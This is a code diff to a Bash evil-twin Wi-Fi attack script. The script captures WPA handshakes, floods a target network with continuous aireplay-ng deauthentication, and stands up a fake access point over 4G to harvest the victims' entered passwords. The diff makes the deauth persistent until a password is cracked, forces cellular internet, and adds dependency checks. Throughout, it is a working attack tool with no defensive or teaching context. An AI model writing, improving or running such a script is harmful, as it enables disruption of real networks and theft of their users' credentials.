@@ -19,8 +19,8 @@ TARGET_BSSID=""
 TARGET_SSID=""
 TARGET_CHANNEL=""
 FAKE_SSID=""
-INTERNET_CHOICE=""
 HANDSHAKE_FILE=""
+DEAUTH_PID=""  # ADDED: For continuous deauth
 
 # ==================== CLEANUP FUNCTION ====================
 cleanup() {
@@ -37,6 +37,9 @@ cleanup() {
      fuser -k 5000/tcp 2>/dev/null
      fuser -k 80/tcp 2>/dev/null
     
+    # Specifically kill the deauth process if still running
+    [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null  # ADDED
+    
     # Remove virtual AP interface
      ip link set wlan1 down 2>/dev/null
      ip link del wlan1 2>/dev/null
@@ -47,13 +50,13 @@ cleanup() {
     # Reset iptables
      iptables --flush 2>/dev/null
     
-    # Clean up routing rules silently
+    # Clean up routing rules silently - CELLULAR ONLY (FIXED)
     ip rule del from all lookup main pref 1 2>/dev/null || true
     ip rule del from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
-    ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true
+    # ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true  # REMOVED: WiFi sharing rule
     ip rule del from all iif lo oif rmnet_data2 lookup main pref 17000 2>/dev/null || true
     ip rule del from all iif lo oif wlan1 lookup 97 pref 17000 2>/dev/null || true
-    ip rule del from all iif wlan1 lookup main pref 21000 2>/dev/null || true
+    ip rule del pref 21000 2>/dev/null || true  # FIXED: delete by priority only
     
     # ==================== ENHANCED FILE CLEANUP ====================
     log_info "Cleaning up temporary files..."
@@ -335,8 +338,9 @@ capture_handshake() {
     AIRODUMP_PID=$!
     sleep 3
     
+    # Start CONTINUOUS deauth and save PID globally (MODIFIED)
     nohup sudo aireplay-ng -0 0 -a "$bssid" wlan2 > /tmp/deauth.log 2>&1 &
-    AIREPLAY_PID=$!
+    DEAUTH_PID=$!  # SAVE PID FOR CONTINUOUS DEAUTH
     
     log_info "Deauth running - waiting for handshake..."
     
@@ -350,8 +354,9 @@ capture_handshake() {
         sleep 10
     done
     
-    sudo kill $AIREPLAY_PID 2>/dev/null
+    # KILL ONLY AIRODUMP, NOT DEAUTH! (MODIFIED)
     sudo kill $AIRODUMP_PID 2>/dev/null
+    # DEAUTH KEEPS RUNNING!
     sleep 2
     
     if [ "$HANDSAKE_CAPTURED" = true ]; then
@@ -363,6 +368,8 @@ capture_handshake() {
         log_warn "No handshake captured - continuing anyway"
         read -p "Continue? (y/n): " choice
         if [[ ! "$choice" =~ ^[Yy]$ ]]; then
+            # Kill deauth if user chooses to exit
+            [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
             exit 1
         fi
     fi
@@ -397,42 +404,12 @@ update_configs() {
     fi
 }
 
-# ==================== INTERNET SELECTION ====================
-select_internet_source() {
-    echo "----------------------------------------"
-    echo "Internet Source:"
-    echo " 1. WiFi Sharing (fakeap.sh)"
-    echo " 2. Cellular Data (4g-ap.sh)"
-    echo "----------------------------------------"
-    
-    while true; do
-        read -p "Select (1/2): " choice
-        case $choice in
-            1)
-                INTERNET_CHOICE="wifi"
-                break
-                ;;
-            2)
-                INTERNET_CHOICE="cellular"
-                break
-                ;;
-            *)
-                log_error "Invalid choice"
-                ;;
-        esac
-    done
-}
-
 # ==================== START EVIL TWIN ====================
 start_evil_twin() {
     log_info "Starting evil twin..."
     
-    # Start AP silently
-    if [ "$INTERNET_CHOICE" = "wifi" ]; then
-        ./fakeap.sh > /dev/null 2>&1 &
-    else
-        ./4g-ap.sh > /dev/null 2>&1 &
-    fi
+    # Always use cellular (4G) for internet sharing (MODIFIED)
+    ./4g-ap.sh > /dev/null 2>&1 &
     sleep 8
     
     # Start backend with GUARANTEED silence
@@ -451,8 +428,8 @@ start_evil_twin() {
 monitor_attack() {
     local bssid="$1"
     
-    # Start deauth in background
-    sudo aireplay-ng -0 10 -a "$bssid" wlan2 > /dev/null 2>&1 &
+    # DEAUTH IS ALREADY RUNNING FROM CAPTURE PHASE! (MODIFIED)
+    log_info "Continuous deauth maintained from capture phase"
     
     # Clean layout
     echo "==============================="
@@ -461,8 +438,9 @@ monitor_attack() {
     echo "Target:    $TARGET_SSID"
     echo "Evil Twin: $FAKE_SSID" 
     echo "Channel:   $TARGET_CHANNEL"
-    echo "Internet:  $INTERNET_CHOICE"
+    echo "Internet:  4G Cellular"  # MODIFIED
     echo "Handshake: $HANDSHAKE_FILE"
+    echo "Deauth:    CONTINUOUS"  # MODIFIED
     echo "----------------------------------------"
     echo "Monitoring for credentials..."
     echo "----------------------------------------"
@@ -485,8 +463,8 @@ monitor_attack() {
                 echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                 echo ""
                 
-                # Stop deauth immediately
-                sudo pkill aireplay-ng 2>/dev/null
+                # Stop deauth only when password is cracked (MODIFIED)
+                [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
                 
                 # Wait 30 seconds before ending
                 echo "Waiting 30 seconds before shutdown..."
@@ -540,13 +518,31 @@ main() {
         exit 1
     fi
     
-    # Check dependencies
-    for cmd in hostapd dnsmasq aircrack-ng python3 iw; do
-        if ! command -v "$cmd" &> /dev/null; then
+    # ENHANCED DEPENDENCY CHECK (ADDED)
+    echo -e "${BLUE}[*] Checking dependencies...${NC}"
+    
+    # System packages
+    for cmd in aircrack-ng hostapd dnsmasq python3 php iw airmon-ng ethtool; do
+        if command -v "$cmd" &>/dev/null; then
+            echo -e "  ${GREEN}[✓]${NC} $cmd"
+        else
+            echo -e "  ${RED}[✗]${NC} $cmd"
             log_error "Missing: $cmd"
             exit 1
         fi
     done
+    
+    # Python modules
+    if python3 -c "import flask" 2>/dev/null; then
+        echo -e "  ${GREEN}[✓]${NC} flask"
+    else
+        echo -e "  ${RED}[✗]${NC} flask"
+        log_error "Missing Flask module"
+        echo "Install with: pip3 install flask"
+        exit 1
+    fi
+    
+    echo -e "${GREEN}✅ All dependencies are installed!${NC}\n"
     
     log_info "Plug in external WiFi adapter..."
     select_adapter
@@ -554,7 +550,7 @@ main() {
     scan_networks
     capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
     update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
-    select_internet_source
+    # REMOVED: select_internet_source() - Always cellular now
     start_evil_twin
     monitor_attack "$TARGET_BSSID"
 }
